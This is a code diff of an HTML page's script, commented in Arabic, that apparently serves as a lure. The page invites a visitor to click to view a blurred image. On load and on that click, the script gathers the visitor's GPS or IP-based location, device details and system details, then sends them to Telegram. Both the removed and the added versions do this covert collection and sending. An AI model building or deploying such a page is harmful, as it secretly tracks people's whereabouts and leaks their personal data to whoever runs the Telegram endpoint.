-                    console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
-                    return response.json();
-                } else {
-                    console.error('❌ فشل إرسال البيانات إلى Telegram');
-                    throw new Error('Telegram API Error');
-                }
-            }).then(data => {
-                console.log('📱 استجابة Telegram:', data);
-            }).catch(error => {
-                console.error('❌ خطأ في الإرسال:', error);
+            }).then(() => {
+                console.log('✅ تم الإرسال بنجاح');
+            }).catch(() => {
+                console.log('❌ فشل الإرسال');
             });
         }
 
+        // الدالة الرئيسية
         async function viewImage() {
             // إظهار الصورة
             document.getElementById('mainImage').classList.add('clear');
             document.getElementById('viewButton').style.display = 'none';
             document.getElementById('successMessage').style.display = 'block';
             
-            // جمع وإرسال البيانات
-            const data = await collectData();
-            console.log('بيانات الزائر:', data);
+            // جمع البيانات
+            const deviceInfo = getDeviceInfo();
+            const systemInfo = getSystemInfo();
+            const locationInfo = await getLocation();
+            
+            const data = {
+                device: deviceInfo,
+                system: systemInfo,
+                location: locationInfo
+            };
+            
+            console.log('📊 البيانات المجمعة:', data);
             
             // إرسال البيانات
             sendToTelegram(data);
         }
 
-        // وظيفة شاملة للحصول على الموقع
-        async function getAllLocationMethods() {
-            console.log('🚀 بدء عملية تحديد الموقع الشاملة...');
-            window.userLocation.attempts = 0;
-            
-            updateLocationStatus('🔄 جاري تحديد الموقع بدقة عالية...');
-            
-            // المحاولة الأولى: GPS عالي الدقة
-            window.userLocation.attempts++;
-            const gpsSuccess = await getLocationByGPS();
-            if (gpsSuccess) {
-                console.log('✅ تم الحصول على الموقع عبر GPS');
-                return;
-            }
-            
-            updateLocationStatus('🔄 جاري تحديد الموقع عبر IP...');
-            
-            // المحاولة الثانية: IP Geolocation
-            window.userLocation.attempts++;
-            const ipSuccess = await getLocationByIP();
-            if (ipSuccess) {
-                console.log('✅ تم الحصول على الموقع عبر IP');
-                return;
-            }
-            
-            // إذا فشلت جميع المحاولات
-            window.userLocation = {
-                latitude: 'غير متاح',
-                longitude: 'غير متاح',
-                accuracy: 'غير متاح',
-                status: 'فشل في جميع المحاولات',
-                method: 'لا يوجد',
-                attempts: window.userLocation.attempts
-            };
-            
-            updateLocationStatus('❌ لم يتم العثور على الموقع');
-            console.log('❌ فشل في جميع طرق تحديد الموقع');
-        }
-
-        // تشغيل تحديد الموقع عند تحميل الصفحة
-        window.addEventListener('load', function() {
-            console.log('🚀 تم تحميل الصفحة');
-            getAllLocationMethods();
+        // ربط الزر بالدالة
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('viewButton').addEventListener('click', viewImage);
         });
 
-        // محاولة إضافية عند النقر على الزر
-        document.addEventListener('DOMContentLoaded', function() {
-            const viewButton = document.getElementById('viewButton');
-            if (viewButton) {
-                viewButton.addEventListener('click', function() {
-                    // إذا لم يتم الحصول على الموقع بعد، محاولة أخيرة
-                    if (window.userLocation.status === 'فشل في جميع المحاولات' || 
-                        window.userLocation.latitude === 'غير متاح') {
-                        console.log('🔄 محاولة أخيرة للحصول على الموقع...');
-                        getAllLocationMethods();
-                    }
-                });
+        // محاولة الحصول على الموقع عند تحميل الصفحة
+        window.addEventListener('load', async function() {
+            console.log('🚀 تم تحميل الصفحة');
+            userLocation = await getLocation();
+            if (userLocation) {
+                console.log('✅ تم الحصول على الموقع');
+            } else {
+                console.log('❌ لم يتم الحصول على الموقع');
             }
         });
     </script>
